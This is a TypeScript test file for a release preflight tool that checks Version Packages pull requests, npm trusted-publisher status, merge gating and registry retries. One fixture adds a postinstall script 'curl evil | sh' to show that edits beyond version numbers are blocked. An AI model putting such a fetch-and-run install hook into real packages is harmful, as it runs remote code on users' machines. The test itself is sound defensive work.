import { fakeGitHub, fakeSha, githubPort, type FakeGitHub, type PrFile } from "@titan-design/github";
import { openDatabase, runMigrations } from "@titan-design/store-sqlite";
import { describe, expect, it } from "vitest";
import { OWNER_GATE_POLICY, type EffectivePolicy } from "./policy.js";
import {
  REGISTRY_BACKOFF_MS,
  RELEASE_FREEZE_MS,
  VERSION_PACKAGES_BRANCH,
  blockedOnlyByNpm,
  decideRelease,
  isReleaseFile,
  npmRegistry,
  publishedSince,
  releaseGuard,
  releasePreflight,
  retryingRegistry,
  type PackageRegistry,
  type ReleasePreflight,
} from "./release.js";
import { ShepherdStore, holdReviewerMigration, shepherdMigration, sliceMigration } from "./store.js";

const REPO = "octo/demo";
const HEAD = fakeSha("version-packages-head");
const MERGE_ON_GREEN: EffectivePolicy = { ...OWNER_GATE_POLICY, merge: "auto", seat: "trusted-seat" };
const AUTO: EffectivePolicy = { ...MERGE_ON_GREEN, release: "grant" };
const onNpm = (...names: string[]): PackageRegistry => async (name) => (names.includes(name) ? "trusted" : "missing");

const BASE = fakeSha("base");
const WIDGET = { name: "@demo/widget", version: "1.1.0", scripts: { build: "tsc" }, dependencies: { zod: "^4.0.0" } };
const APP = { name: "@demo/app", version: "0.3.0", private: true, dependencies: { "@demo/widget": "workspace:^1.1.0" } };

/** Writes a manifest at the merge base and at the head, as `changeset version` would leave it. */
function setManifest(fake: FakeGitHub, path: string, base: object, head: object): void {
  fake.files.set(`${BASE}:${path}`, { content: JSON.stringify(base), blobSha: `${path}-base` });
  fake.files.set(`${HEAD}:${path}`, { content: JSON.stringify(head), blobSha: `${path}-head` });
}

/** A Version Packages PR that bumps a public package and a private product that depends on it, and consumes one changeset. */
function versionPackagesPr(files: PrFile[] = []): FakeGitHub {
  const fake = fakeGitHub();
  fake.addPr({ headSha: HEAD, headRef: VERSION_PACKAGES_BRANCH, headRepo: REPO });
  fake.prFiles.set(1, [
    { path: "packages/widget/package.json", status: "modified" },
    { path: "packages/widget/CHANGELOG.md", status: "modified" },
    { path: "products/app/package.json", status: "modified" },
    { path: ".changeset/brave-otters.md", status: "removed" },
    { path: "CAPABILITIES.md", status: "modified" },
    { path: "site/guides/capabilities.md", status: "modified" },
    ...files,
  ]);
  setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0" });
  setManifest(fake, "products/app/package.json", APP, { ...APP, version: "0.3.1", dependencies: { "@demo/widget": "workspace:^1.2.0" } });
  return fake;
}

const preflight = (fake: FakeGitHub, registry: PackageRegistry = onNpm("@demo/widget")) => releasePreflight(githubPort(fake.wire), registry, { repo: REPO, pr: 1, head: HEAD });

describe("isReleaseFile", () => {
  it.each<[PrFile, boolean]>([
    [{ path: "packages/widget/package.json", status: "modified" }, true],
    [{ path: "packages/widget/CHANGELOG.md", status: "added" }, true],
    [{ path: "pnpm-lock.yaml", status: "modified" }, false],
    [{ path: "packages/widget/package.json", status: "added" }, false],
    [{ path: "CAPABILITIES.md", status: "modified" }, true],
    [{ path: "site/guides/capabilities.md", status: "modified" }, true],
    [{ path: ".changeset/brave-otters.md", status: "removed" }, true],
    [{ path: ".changeset/brave-otters.md", status: "added" }, false],
    [{ path: "packages/widget/src/index.ts", status: "modified" }, false],
    [{ path: ".github/workflows/package.json", status: "added" }, false],
    [{ path: "packages/widget/package.json", status: "renamed", previousPath: "src/package.json" }, false],
  ])("reads %o as a file changesets writes: %s", (file, expected) => {
    expect(isReleaseFile(file)).toBe(expected);
  });
});

describe("releasePreflight", () => {
  it("passes when every public package in the release is on npm, and skips private ones", async () => {
    expect(await preflight(versionPackagesPr())).toEqual({ head: HEAD, blockers: [], packages: ["@demo/widget"], unpublished: [], versions: { "@demo/widget": "1.2.0" } });
  });

  it("records the head version of each bumped public package, and leaves out a private one and an unbumped one", async () => {
    const fake = versionPackagesPr([{ path: "packages/steady/package.json", status: "modified" }]);
    const steady = { name: "@demo/steady", version: "2.0.0", dependencies: { "@demo/widget": "^1.1.0" } };
    setManifest(fake, "packages/steady/package.json", steady, { ...steady, dependencies: { "@demo/widget": "^1.2.0" } });

    const result = await preflight(fake, onNpm("@demo/widget", "@demo/steady"));

    expect(result.versions).toEqual({ "@demo/widget": "1.2.0" });
  });

  it("blocks a package npm has never seen and names it", async () => {
    const result = await preflight(versionPackagesPr(), onNpm());

    expect(result.blockers).toEqual(["@demo/widget is not on registry.npmjs.org yet; publish its first version by hand (CLAUDE.md, Releasing)"]);
    expect(result.unpublished).toEqual(["@demo/widget"]);
  });

  it("blocks a package whose latest version no trusted publisher published, so the owner is asked before release.yml tries", async () => {
    const result = await preflight(versionPackagesPr(), async () => "untrusted");

    expect(result.blockers).toEqual(["@demo/widget's latest version on registry.npmjs.org has no trusted publisher; the owner confirms one is saved (CLAUDE.md, Releasing)"]);
    expect([result.unpublished, result.untrusted]).toEqual([[], ["@demo/widget"]]);
    expect(decideRelease(AUTO, HEAD, result)).toMatchObject({ outcome: "gate", rule: { rowId: "preflight-blocked" } });
  });

  it("throws when the registry cannot be read, so no blocked result exists for a head npm never answered for", async () => {
    await expect(preflight(versionPackagesPr(), async () => Promise.reject(new Error("HTTP 503")))).rejects.toThrow("HTTP 503");
  });

  it("blocks a file changesets does not write", async () => {
    const result = await preflight(versionPackagesPr([{ path: "packages/widget/src/index.ts", status: "modified" }]));

    expect(result.blockers).toEqual(["it changes files a release does not write: packages/widget/src/index.ts"]);
  });

  it("blocks a manifest edit beyond version, such as an added script", async () => {
    const fake = versionPackagesPr();
    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", scripts: { build: "tsc", postinstall: "curl evil | sh" } });

    const result = await preflight(fake);

    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: scripts"]);
  });

  it("blocks a dependency range change for a package this release does not bump, or an added dependency", async () => {
    const fake = versionPackagesPr();
    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", dependencies: { zod: "^4.1.0", "left-pad": "1.0.0" } });

    const result = await preflight(fake);

    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: dependencies.zod, dependencies.left-pad"]);
  });

  it("blocks an unreadable manifest rather than failing the run", async () => {
    const fake = versionPackagesPr();
    fake.files.set(`${HEAD}:packages/widget/package.json`, { content: "{ not json", blobSha: "bad" });

    const result = await preflight(fake);

    expect(result.blockers).toContain(`packages/widget/package.json is not a readable package manifest at ${HEAD}`);
  });

  it("blocks a head that is not the changesets branch in this repo, or that moved", async () => {
    const fake = versionPackagesPr();
    Object.assign(fake.pr(1), { headRepo: "fork/demo", headSha: fakeSha("moved") });

    const result = await preflight(fake);

    expect(result.blockers).toEqual([`its head is not ${VERSION_PACKAGES_BRANCH} in ${REPO}`, `its head moved from ${HEAD} to ${fakeSha("moved")}`]);
  });
});

describe("decideRelease", () => {
  const passed: ReleasePreflight = { head: HEAD, blockers: [], packages: ["@demo/widget"], unpublished: [], versions: {} };

  it.each<[string, EffectivePolicy, string | undefined, ReleasePreflight | undefined, string, string]>([
    ["a never seat", { ...AUTO, merge: "never" }, HEAD, passed, "deny", "never"],
    ["no preflight", AUTO, HEAD, undefined, "gate", "no-preflight"],
    ["a preflight at another head", AUTO, HEAD, { ...passed, head: fakeSha("other") }, "gate", "no-preflight"],
    ["a blocked preflight", AUTO, HEAD, { ...passed, blockers: ["@demo/widget is not on registry.npmjs.org yet"] }, "gate", "preflight-blocked"],
    ["an owner-gate seat", OWNER_GATE_POLICY, HEAD, passed, "gate", "owner-gate"],
    ["a passed preflight under an auto seat without the release-merge grant", MERGE_ON_GREEN, HEAD, passed, "gate", "no-release-grant"],
    ["a passed preflight under an auto seat with the release-merge grant", AUTO, HEAD, passed, "allow", "version-packages"],
  ])("decides %s as %s by shepherd-release/%s", (_name, policy, head, found, outcome, rowId) => {
    expect(decideRelease(policy, head, found)).toMatchObject({ outcome, rule: { table: "shepherd-release", rowId } });
  });

  it("names the blocker in a blocked release's reason", () => {
    const decision = decideRelease(AUTO, HEAD, { ...passed, blockers: ["@demo/new is not on registry.npmjs.org yet"] });

    expect(decision.reason).toBe("the release cannot land yet: @demo/new is not on registry.npmjs.org yet");
  });
});

describe("releaseGuard", () => {
  const OTHER = 2;

  function scene() {
    const fake = versionPackagesPr();
    fake.addPr({ headSha: fakeSha("other-head") });
    const db = openDatabase(":memory:");
    runMigrations(db, [shepherdMigration(4), sliceMigration(8), holdReviewerMigration(9)]);
    let clock = Date.parse("2026-01-01T00:00:00Z");
    const store = new ShepherdStore(db, () => clock);
    store.register({ repo: REPO, pr: 1, branch: VERSION_PACKAGES_BRANCH, runId: "run-vp", task: "demo/version-packages", implementer: "changesets", policy: AUTO });
    const guard = releaseGuard(() => store, () => clock);
    const reason = (pr: number) => guard.reason(githubPort(fake.wire), REPO, pr, "main");
    return { fake, store, reason, advance: (ms: number) => void (clock += ms) };
  }

  it("holds the repo's other merges while the Version Packages PR is ready at its live head", async () => {
    const { store, reason } = scene();
    store.setReleaseReady("run-vp", HEAD);

    expect(await reason(OTHER)).toBe(`the Version Packages PR #1 is ready at ${HEAD} and lands first`);
    expect(await reason(1)).toBeUndefined();
  });

  it("holds nothing before the preflight marks a head ready, or after the mark is cleared", async () => {
    const { store, reason } = scene();
    const before = await reason(OTHER);
    store.setReleaseReady("run-vp", HEAD);
    store.setReleaseReady("run-vp", null);

    expect([before, await reason(OTHER)]).toEqual([undefined, undefined]);
  });

  it("lets other merges go once the Version Packages PR merged, moved, or the freeze ran out", async () => {
    const merged = scene();
    merged.store.setReleaseReady("run-vp", HEAD);
    Object.assign(merged.fake.pr(1), { state: "closed", merged: true });
    const moved = scene();
    moved.store.setReleaseReady("run-vp", HEAD);
    moved.fake.pushHead(1, fakeSha("regenerated"));
    const stale = scene();
    stale.store.setReleaseReady("run-vp", HEAD);
    stale.advance(RELEASE_FREEZE_MS + 1);

    expect([await merged.reason(OTHER), await moved.reason(OTHER), await stale.reason(OTHER)]).toEqual([undefined, undefined, undefined]);
  });
});

describe("npmRegistry", () => {
  const requested: { url: string; signal: AbortSignal | null | undefined }[] = [];
  const answering = (status: number, latest?: object) => async (url: string | URL | Request, init?: RequestInit) => {
    requested.push({ url: String(url), signal: init?.signal });
    return new Response(latest === undefined ? null : JSON.stringify(latest), { status });
  };
  const read = (status: number, latest?: object) => npmRegistry(answering(status, latest))("@demo/widget");
  const HAND = { version: "0.0.0", _npmUser: { name: "owner", email: "owner@example.com" }, dist: {} };

  it("reads a scoped package's latest version by its escaped name, under a timeout", async () => {
    await read(200, HAND);

    expect(requested.at(-1)?.url).toBe("https://registry.npmjs.org/@demo%2fwidget/latest");
    expect(requested.at(-1)?.signal).toBeInstanceOf(AbortSignal);
  });

  it.each<[string, string, object]>([
    ["a trusted publisher on its latest version", "trusted", { ...HAND, _npmUser: { name: "GitHub Actions", trustedPublisher: { id: "github", oidcConfigId: "config-1" } } }],
    ["a hand publish with no trusted publisher", "untrusted", HAND],
    ["a null trusted publisher", "untrusted", { ...HAND, _npmUser: { ...HAND._npmUser, trustedPublisher: null } }],
    ["a false trusted publisher", "untrusted", { ...HAND, _npmUser: { ...HAND._npmUser, trustedPublisher: false } }],
    ["an empty trusted publisher", "untrusted", { ...HAND, _npmUser: { ...HAND._npmUser, trustedPublisher: {} } }],
    ["a token publish with provenance attestations only", "untrusted", { ...HAND, dist: { attestations: { url: "https://registry.npmjs.org/-/npm/v1/attestations/x", provenance: { predicateType: "https://slsa.dev/provenance/v1" } } } }],
  ])("reads %s as %s", async (_name, presence, latest) => {
    expect(await read(200, latest)).toBe(presence);
  });

  it("reads a 404 as missing, and throws on any other failure or an unreadable body", async () => {
    expect(await read(404)).toBe("missing");
    await expect(read(500)).rejects.toThrow(/answered 500/);
    await expect(read(200)).rejects.toThrow();
  });
});

describe("retryingRegistry", () => {
  /** A registry that throws for its first `failures` reads, then has every package; it records each wait. */
  function flaky(failures: number) {
    const waits: number[] = [];
    let reads = 0;
    const registry: PackageRegistry = async () => {
      reads += 1;
      if (reads <= failures) throw new Error(`HTTP 503 on read ${reads}`);
      return "trusted";
    };
    const sleep = async (ms: number) => void waits.push(ms);
    return { retrying: retryingRegistry(registry, sleep, new AbortController().signal), waits, reads: () => reads };
  }

  it("reads again after each backoff and answers once the registry recovers", async () => {
    const { retrying, waits } = flaky(2);

    expect(await retrying("@demo/widget")).toBe("trusted");
    expect(waits).toEqual(REGISTRY_BACKOFF_MS.slice(0, 2));
  });

  it("throws the last failure once every backoff ran out", async () => {
    const { retrying, waits, reads } = flaky(Number.POSITIVE_INFINITY);

    await expect(retrying("@demo/widget")).rejects.toThrow(`HTTP 503 on read ${REGISTRY_BACKOFF_MS.length + 1}`);
    expect([waits, reads()]).toEqual([REGISTRY_BACKOFF_MS, REGISTRY_BACKOFF_MS.length + 1]);
  });

  it("answers a 404 at once, without waiting", async () => {
    const waits: number[] = [];
    const retrying = retryingRegistry(onNpm(), async (ms) => void waits.push(ms), new AbortController().signal);

    expect([await retrying("@demo/widget"), waits]).toEqual(["missing", []]);
  });
});

describe("blockedOnlyByNpm", () => {
  const unpublished: ReleasePreflight = { head: HEAD, blockers: ["@demo/widget is not on registry.npmjs.org yet"], packages: ["@demo/widget"], unpublished: ["@demo/widget"], versions: {} };
  const results = (result: object) => ({ [`dispatch:sh-release-preflight:${HEAD}#0`]: { stepId: `sh-release-preflight:${HEAD}`, iteration: 0, agentId: null, signal: null, completedAt: "2026-01-01T00:00:00Z", data: { result } } });
  const prompt = `Merge PR #1 in ${REPO} at head ${HEAD}? CI is green. Policy shepherd-release/preflight-blocked: the release cannot land yet`;

  it("finds the preflight a gate at its head asks about when unpublished packages are its only blockers", () => {
    expect(blockedOnlyByNpm(results(unpublished), prompt)).toEqual(unpublished);
  });

  it.each<[string, object, string]>([
    ["another blocker beside the unpublished package", { ...unpublished, blockers: [...unpublished.blockers, "it changes files a release does not write: src/a.ts"] }, prompt],
    ["a malformed manifest and nothing unpublished", { ...unpublished, blockers: ["packages/widget/package.json is not a readable package manifest"], unpublished: [] }, prompt],
    ["a result stored before unpublished was recorded", { head: HEAD, blockers: ["@demo/widget is not on registry.npmjs.org yet"], packages: ["@demo/widget"] }, prompt],
    ["a gate about another head", unpublished, `Merge PR #1 in ${REPO} at head ${fakeSha("other")}?`],
    ["a conflict gate at the same head", unpublished, `Merge PR #1 in ${REPO} at head ${HEAD}? CI is green. Policy shepherd-route/conflict: the branch conflicts`],
  ])("finds nothing for %s", (_name, result, gatePrompt) => {
    expect(blockedOnlyByNpm(results(result), gatePrompt)).toBeUndefined();
  });
});

describe("publishedSince", () => {
  const preflight: ReleasePreflight = { head: HEAD, blockers: ["a", "b"], packages: ["@demo/a", "@demo/b"], unpublished: ["@demo/a", "@demo/b"], versions: {} };

  it("is true only once npm has every package that blocked the release", async () => {
    expect([await publishedSince(onNpm("@demo/a"), preflight), await publishedSince(onNpm("@demo/a", "@demo/b"), preflight)]).toEqual([false, true]);
  });

  it("reads an unreadable registry as not yet, so the next sweep asks again", async () => {
    expect(await publishedSince(async () => Promise.reject(new Error("HTTP 503")), preflight)).toBe(false);
  });
});
